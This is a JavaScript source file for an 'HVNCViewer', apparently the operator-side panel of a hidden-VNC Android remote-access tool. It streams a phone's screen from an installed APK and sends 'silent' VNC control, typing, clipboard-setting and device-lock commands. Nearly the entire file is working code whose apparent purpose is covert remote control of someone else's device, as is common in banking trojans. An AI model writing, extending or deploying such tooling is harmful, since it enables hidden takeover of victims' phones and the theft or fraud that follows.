'use strict';
/**
 * HVNCViewer — Zero-lag HVNC with Worker GPU decode.
 *
 * Full pipeline:
 *   WS binary arrives (raw JPEG from APK binary send)
 *     → parse 49-byte header (O(1) DataView ops)
 *     → postMessage(jpeg, [transfer])          ← zero-copy Transferable
 *       → [DecodeWorker] createImageBitmap()   ← GPU JPEG decode, off main thread
 *       → postMessage(ImageBitmap, [transfer]) ← GPU bitmap, zero-copy back
 *     → pendingBitmap = bmp
 *     → requestAnimationFrame
 *       → ctx.drawImage(pendingBitmap)         ← GPU blit, <0.1ms
 *
 * Features:
 *   - Worker-based GPU JPEG decode (main thread never stalls)
 *   - desynchronized canvas (skips vsync for lower latency)
 *   - CRC32 drop-oldest policy (always newest frame)
 *   - Adaptive quality slider → SET_SILENT_VNC_QUALITY
 *   - Pinch-to-zoom + scroll-wheel zoom
 *   - Mouse: TAP / LONG_PRESS / SWIPE / right-click menu
 *   - Keyboard: full Android keycode mapping
 *   - Clipboard paste → SET_CLIPBOARD + TYPE
 *   - FPS sparkline overlay
 *   - End-to-end latency display (from 49-byte header timestamp)
 *   - Touch support for tablet operators
 */

// ── Inline DecodeWorker ────────────────────────────────────────────────────────
const _WORKER_SRC = `
self.onmessage = async ({ data: { seq, buf } }) => {
  try {
    const bmp = await createImageBitmap(
      new Blob([buf], { type: 'image/jpeg' }),
      { premultiplyAlpha: 'none', colorSpaceConversion: 'none' }
    );
    self.postMessage({ seq, bmp }, [bmp]);
  } catch { /* corrupt frame — silently drop */ }
};
`;

let _worker    = null;
let _workerRef = 0;

function acquireWorker() {
  if (!_worker) {
    const blob = new Blob([_WORKER_SRC], { type: 'application/javascript' });
    _worker = new Worker(URL.createObjectURL(blob));
  }
  _workerRef++;
  return _worker;
}

function releaseWorker() {
  if (--_workerRef <= 0 && _worker) {
    _worker.terminate();
    _worker    = null;
    _workerRef = 0;
  }
}

// ── FPS sparkline ──────────────────────────────────────────────────────────────
class FpsSparkline {
  constructor(w = 80, h = 24, maxFps = 30) {
    this.w = w; this.h = h; this.maxFps = maxFps;
    this.history = new Array(w).fill(0);
  }

  push(fps) {
    this.history.shift();
    this.history.push(Math.min(fps, this.maxFps));
  }

  draw(ctx, x, y) {
    const { w, h, history, maxFps } = this;
    ctx.save();

    // Background
    ctx.fillStyle = 'rgba(0,0,0,0.55)';
    ctx.fillRect(x, y, w + 56, h + 6);

    // Sparkline bars
    for (let i = 0; i < w; i++) {
      const v   = history[i];
      const bh  = Math.round((v / maxFps) * h);
      const hue = 120 * (v / maxFps); // green=good, red=bad
      ctx.fillStyle = `hsl(${hue},80%,48%)`;
      ctx.fillRect(x + i, y + h - bh + 3, 1, bh);
    }

    // Current value text
    const cur  = history[w - 1];
    const lat  = this._lat ?? -1;
    ctx.font   = 'bold 11px monospace';
    ctx.fillStyle = cur >= 10 ? '#3dba7a' : cur >= 4 ? '#e0b84a' : '#e05c5c';
    ctx.fillText(`${cur.toFixed(1)}fps`, x + w + 3, y + 12);
    ctx.font      = '9px monospace';
    ctx.fillStyle = '#6666aa';
    ctx.fillText(lat >= 0 ? `${lat}ms` : '---', x + w + 3, y + 24);

    ctx.restore();
  }

  setLatency(ms) { this._lat = ms; }
}

// ── HVNCViewer ─────────────────────────────────────────────────────────────────
class HVNCViewer {
  /**
   * @param {HTMLElement} container  — host element
   * @param {string}      deviceId
   * @param {Function}    sendFn     — ws.sendJson(obj)
   * @param {{ frameW, frameH, screenW, screenH }} opts
   */
  constructor(container, deviceId, sendFn, opts = {}) {
    this.container = container;
    this.deviceId  = deviceId;
    this._send     = sendFn;

    // APK captures at frameW×frameH (HvncEngine: 360×computed)
    this.frameW  = opts.frameW  ?? 360;
    this.frameH  = opts.frameH  ?? 780;
    // Real device screen (for coord mapping)
    this.screenW = opts.screenW ?? 1080;
    this.screenH = opts.screenH ?? 1920;

    // Zoom state
    this._zoom   = 1.0;
    this._panX   = 0;
    this._panY   = 0;

    // Quality (mirrors what we send to device)
    this._quality = 50;

    // ── Canvas ───────────────────────────────────────────────────────────────
    this._buildUI();

    // ── Frame pipeline ────────────────────────────────────────────────────────
    this._pending   = null; // ImageBitmap ready to draw
    this._seq       = 0;
    this._latestSeq = -1;
    this._rafId     = null;

    // ── Metrics ───────────────────────────────────────────────────────────────
    this._times    = [];   // rolling frame arrival timestamps (60-frame window)
    this._latencies = [];
    this._dropped   = 0;
    this._sparkline = new FpsSparkline(80, 24, 30);
    this._sparkTimer = setInterval(() => this._sparkline.push(this.fps), 1000);
    this._showOverlay = true;

    // ── Quality adaptation ────────────────────────────────────────────────────
    this._stableLow  = 0;
    this._stableHigh = 0;
    this._qaTimer    = setInterval(() => this._adaptQuality(), 1000);

    // ── Worker ────────────────────────────────────────────────────────────────
    this._worker = acquireWorker();
    this._worker.onmessage = ({ data: { seq, bmp } }) => {
      if (seq < this._latestSeq) { bmp.close(); this._dropped++; return; }
      this._latestSeq = seq;
      if (this._pending) { this._pending.close(); this._dropped++; }
      this._pending = bmp;
    };

    // ── Input ─────────────────────────────────────────────────────────────────
    this._mouse = { down: false, origin: null, t: 0 };
    this._pinch = { dist: 0, active: false };
    this._bindInput();

    // ── Start ─────────────────────────────────────────────────────────────────
    this._startRenderLoop();
    this._drawPlaceholder();
  }

  // ── UI build ─────────────────────────────────────────────────────────────────
  _buildUI() {
    this.container.innerHTML = `
      <div style="display:flex;flex-direction:column;width:100%;height:100%;background:#000">
        <div id="_hvnc_toolbar" style="
          display:flex;align-items:center;gap:8px;padding:6px 10px;
          background:#10101a;border-bottom:1px solid #1e1e32;flex-shrink:0">
          <span style="font-size:11px;color:#555">Quality</span>
          <input type="range" id="_hvnc_q" min="10" max="85" value="${this._quality}" step="5"
            style="width:100px;accent-color:#7c6af7">
          <span id="_hvnc_ql" style="font-size:11px;color:#7c6af7;width:28px">${this._quality}%</span>
          <span style="font-size:11px;color:#555;margin-left:4px">Zoom</span>
          <input type="range" id="_hvnc_zoom" min="50" max="300" value="100" step="10"
            style="width:80px;accent-color:#3dba7a">
          <span id="_hvnc_zl" style="font-size:11px;color:#3dba7a;width:36px">100%</span>
          <button id="_hvnc_reset_zoom" style="background:none;border:1px solid #2a2a42;color:#555;border-radius:4px;padding:2px 7px;font-size:10px;cursor:pointer">Reset</button>
          <span style="flex:1"></span>
          <span id="_hvnc_dim" style="font-size:10px;color:#333356">${this.frameW}×${this.frameH}</span>
        </div>
        <div style="flex:1;overflow:hidden;display:flex;align-items:center;justify-content:center">
          <canvas id="_hvnc_cv" tabindex="0" style="
            max-width:100%;max-height:100%;object-fit:contain;
            cursor:crosshair;outline:none;user-select:none;touch-action:none;
            transform-origin:center center;transition:transform 0.05s linear"></canvas>
        </div>
      </div>`;

    this.canvas = this.container.querySelector('#_hvnc_cv');
    this.canvas.width  = this.frameW;
    this.canvas.height = this.frameH;

    // desynchronized=true: skip vsync sync — lower display latency
    this.ctx = this.canvas.getContext('2d', { alpha: false, desynchronized: true });
    this.canvas.focus();

    // Quality slider
    const qSlider = this.container.querySelector('#_hvnc_q');
    const qLabel  = this.container.querySelector('#_hvnc_ql');
    qSlider.addEventListener('input', () => {
      this._quality = parseInt(qSlider.value);
      qLabel.textContent = this._quality + '%';
      this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
    });

    // Zoom slider
    const zSlider = this.container.querySelector('#_hvnc_zoom');
    const zLabel  = this.container.querySelector('#_hvnc_zl');
    zSlider.addEventListener('input', () => {
      this._zoom = parseInt(zSlider.value) / 100;
      zLabel.textContent = zSlider.value + '%';
      this._applyZoom();
    });

    this.container.querySelector('#_hvnc_reset_zoom').addEventListener('click', () => {
      this._zoom = 1; zSlider.value = 100; zLabel.textContent = '100%';
      this._applyZoom();
    });
  }

  _applyZoom() {
    this.canvas.style.transform = `scale(${this._zoom})`;
  }

  // ── Public: receive JPEG frame (called by dash.js) ─────────────────────────
  onFrame(jpegBuf, serverTs) {
    const seq = ++this._seq;
    const now = performance.now();

    this._times.push(now);
    if (this._times.length > 60) this._times.shift();

    if (serverTs > 0) {
      const lat = Date.now() - serverTs;
      if (lat >= 0 && lat < 8000) {
        this._latencies.push(lat);
        if (this._latencies.length > 30) this._latencies.shift();
        this._sparkline.setLatency(Math.round(
          this._latencies.reduce((a,b) => a+b, 0) / this._latencies.length
        ));
      }
    }

    // Transfer to worker — zero-copy Transferable
    this._worker.postMessage({ seq, buf: jpegBuf }, [jpegBuf]);
  }

  // ── Metrics ───────────────────────────────────────────────────────────────
  get fps() {
    const t = this._times;
    if (t.length < 2) return 0;
    const span = t[t.length - 1] - t[0];
    return span > 0 ? (t.length - 1) / (span / 1000) : 0;
  }

  get avgLatency() {
    if (!this._latencies.length) return -1;
    return Math.round(this._latencies.reduce((a,b)=>a+b,0) / this._latencies.length);
  }

  toggleOverlay() { this._showOverlay = !this._showOverlay; }

  // ── Render loop ────────────────────────────────────────────────────────────
  _startRenderLoop() {
    const tick = () => {
      this._rafId = requestAnimationFrame(tick);
      if (!this._pending) return;

      this.ctx.drawImage(this._pending, 0, 0, this.canvas.width, this.canvas.height);
      this._pending.close();
      this._pending = null;

      if (this._showOverlay) this._drawOverlay();
    };
    this._rafId = requestAnimationFrame(tick);
  }

  _drawOverlay() {
    // Draw sparkline in top-left
    this._sparkline.draw(this.ctx, 4, 4);
  }

  _drawPlaceholder() {
    const c = this.ctx, w = this.canvas.width, h = this.canvas.height;
    c.fillStyle = '#0a0a14';
    c.fillRect(0, 0, w, h);
    c.fillStyle = '#1e1e32';
    c.fillRect(0, 0, w, h);
    // Phone outline
    c.strokeStyle = '#2a2a5a';
    c.lineWidth = 2;
    c.beginPath();
    c.roundRect(w/2 - 80, h/2 - 140, 160, 280, 12);
    c.stroke();
    c.fillStyle = '#333356';
    c.font = 'bold 13px monospace';
    c.textAlign = 'center';
    c.fillText('Waiting for stream…', w/2, h/2 + 20);
    c.font = '10px monospace';
    c.fillStyle = '#2a2a4a';
    c.fillText('START_SILENT_VNC sent', w/2, h/2 + 38);
    c.textAlign = 'left';
  }

  // ── Quality adaptation ─────────────────────────────────────────────────────
  _adaptQuality() {
    const fps = this.fps;
    if (fps === 0) { this._stableLow = this._stableHigh = 0; return; }

    if (fps < 4)  { this._stableLow++;  this._stableHigh = 0; }
    else if (fps > 18) { this._stableHigh++; this._stableLow  = 0; }
    else { this._stableLow = this._stableHigh = 0; }

    // Drop quality after 6 consecutive bad seconds
    if (this._stableLow >= 6 && this._quality > 15) {
      this._quality = Math.max(15, this._quality - 10);
      this._updateQualitySlider();
      this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableLow = 0;
    }

    // Raise quality after 8 consecutive good seconds
    if (this._stableHigh >= 8 && this._quality < 80) {
      this._quality = Math.min(80, this._quality + 5);
      this._updateQualitySlider();
      this._cmd('SET_SILENT_VNC_QUALITY', { quality: this._quality });
      this._stableHigh = 0;
    }
  }

  _updateQualitySlider() {
    const sl = this.container.querySelector('#_hvnc_q');
    const lb = this.container.querySelector('#_hvnc_ql');
    if (sl) sl.value = this._quality;
    if (lb) lb.textContent = this._quality + '%';
  }

  // ── Coordinate mapping ────────────────────────────────────────────────────
  _mapCoords(clientX, clientY) {
    const r  = this.canvas.getBoundingClientRect();
    const sx = (this.frameW / r.width)  / this._zoom;
    const sy = (this.frameH / r.height) / this._zoom;
    // Return normalized 0.0-1.0 — APK auto-detects x<=1.0 as vnc_norm
    return {
      x: Math.max(0, Math.min(1, ((clientX - r.left) * sx) / this.frameW)),
      y: Math.max(0, Math.min(1, ((clientY - r.top)  * sy) / this.frameH)),
    };
  }

  // ── Commands ───────────────────────────────────────────────────────────────
  _cmd(cmd, args = {}) {
    this._send({ type: 'cmd', target: this.deviceId, payload: { cmd, args } });
  }

  // ── Input ──────────────────────────────────────────────────────────────────
  _bindInput() {
    const c = this.canvas;

    // ── Context menu → LONG_PRESS ─────────────────────────────────────────
    c.addEventListener('contextmenu', e => {
      e.preventDefault();
      const pos = this._mapCoords(e.clientX, e.clientY);
      this._cmd('LONG_PRESS', { x: pos.x, y: pos.y });
    });

    // ── Mouse click/drag ──────────────────────────────────────────────────
    c.addEventListener('mousedown', e => {
      if (e.button !== 0) return;
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(e.clientX, e.clientY);
      this._mouse.t      = performance.now();
      c.focus();
    });

    c.addEventListener('mouseup', e => {
      if (!this._mouse.down) return;
      this._mouse.down = false;
      const up  = this._mapCoords(e.clientX, e.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < 14) {
        this._cmd(dur < 500 ? 'TAP' : 'LONG_PRESS',
          { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y,
          duration: Math.max(80, Math.min(Math.round(dur), 1500)),
        });
      }
    });

    c.addEventListener('mouseleave', () => { this._mouse.down = false; });

    // ── Scroll → swipe or zoom ────────────────────────────────────────────
    c.addEventListener('wheel', e => {
      e.preventDefault();
      if (e.ctrlKey || e.metaKey) {
        // Ctrl+scroll → zoom
        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
        this._applyZoom();
        const sl = this.container.querySelector('#_hvnc_zoom');
        const lb = this.container.querySelector('#_hvnc_zl');
        if (sl) sl.value = Math.round(this._zoom * 100);
        if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
        return;
      }
      // Normal scroll → device scroll
      const pos   = this._mapCoords(e.clientX, e.clientY);
      const delta = e.deltaY > 0 ? 400 : -400;
      this._cmd('SWIPE', {
        x1: pos.x, y1: pos.y,
        x2: pos.x, y2: pos.y - delta,
        duration: 200,
      });
    }, { passive: false });

    // ── Keyboard ──────────────────────────────────────────────────────────
    c.addEventListener('keydown', e => {
      e.preventDefault();

      // Ctrl shortcuts
      if (e.ctrlKey || e.metaKey) {
        switch (e.key.toLowerCase()) {
          case 'h': this._cmd('HOME', {}); return;
          case 'b': this._cmd('BACK', {}); return;
          case 'r': this._cmd('RECENTS', {}); return;
          case 'v': // Paste clipboard
            navigator.clipboard.readText().then(text => {
              if (text) {
                this._cmd('SET_CLIPBOARD', { text });
                setTimeout(() => this._cmd('TYPE', { text }), 100);
              }
            }).catch(() => {});
            return;
          case 'c': // Lock screen
            this._cmd('LOCK_DEVICE', {});
            return;
        }
      }

      // Navigation
      switch (e.key) {
        case 'Escape':     this._cmd('BACK',    {});              return;
        case 'F1':         this._cmd('HOME',    {});              return;
        case 'F2':         this._cmd('RECENTS', {});              return;
        case 'F3':         this._cmd('QUICK_SETTINGS', {});       return;
        case 'F5':         this._cmd('FORCE_RESTART_VNC', {});    return;
        case 'Tab':        this._cmd('TYPE', { text: '\t' });     return;
        case 'Backspace':  this._cmd('TYPE', { text: '\b' });     return;
        case 'Enter':      this._cmd('TYPE', { text: '\n' });     return;
        case 'Delete':     this._cmd('TYPE', { text: '\x7f' });   return;
        case 'ArrowUp':
          this._cmd('SWIPE',{x1:this.frameW/2,y1:this.frameH*0.6,x2:this.frameW/2,y2:this.frameH*0.3,duration:200});
          return;
        case 'ArrowDown':
          this._cmd('SWIPE',{x1:this.frameW/2,y1:this.frameH*0.3,x2:this.frameW/2,y2:this.frameH*0.6,duration:200});
          return;
        case 'ArrowLeft':
          this._cmd('SWIPE',{x1:this.frameW*0.7,y1:this.frameH/2,x2:this.frameW*0.2,y2:this.frameH/2,duration:200});
          return;
        case 'ArrowRight':
          this._cmd('SWIPE',{x1:this.frameW*0.2,y1:this.frameH/2,x2:this.frameW*0.7,y2:this.frameH/2,duration:200});
          return;
      }

      // Printable characters → TYPE
      if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
        this._cmd('TYPE', { text: e.key });
      }
    });

    // ── Touch (tablet operators) ──────────────────────────────────────────
    c.addEventListener('touchstart', e => {
      e.preventDefault();
      if (e.touches.length === 2) {
        // Two-finger pinch
        this._pinch.active = true;
        this._pinch.dist = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        return;
      }
      const t = e.touches[0];
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(t.clientX, t.clientY);
      this._mouse.t      = performance.now();
      c.focus();
    }, { passive: false });

    c.addEventListener('touchmove', e => {
      e.preventDefault();
      if (this._pinch.active && e.touches.length === 2) {
        const newDist = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (newDist / this._pinch.dist)));
        this._pinch.dist = newDist;
        this._applyZoom();
      }
    }, { passive: false });

    c.addEventListener('touchend', e => {
      e.preventDefault();
      this._pinch.active = false;
      if (!this._mouse.down) return;
      this._mouse.down = false;
      const t   = e.changedTouches[0];
      const up  = this._mapCoords(t.clientX, t.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < 14 && dur < 500) {
        this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else if (Math.hypot(dx, dy) < 14) {
        this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y, duration: Math.max(80, Math.round(dur)),
        });
      }
    }, { passive: false });
  }

  // ── Cleanup ────────────────────────────────────────────────────────────────
  destroy() {
    cancelAnimationFrame(this._rafId);
    clearInterval(this._qaTimer);
    clearInterval(this._sparkTimer);
    if (this._pending) { this._pending.close(); this._pending = null; }
    releaseWorker();
    this._cmd('STOP_SILENT_VNC');
  }
}
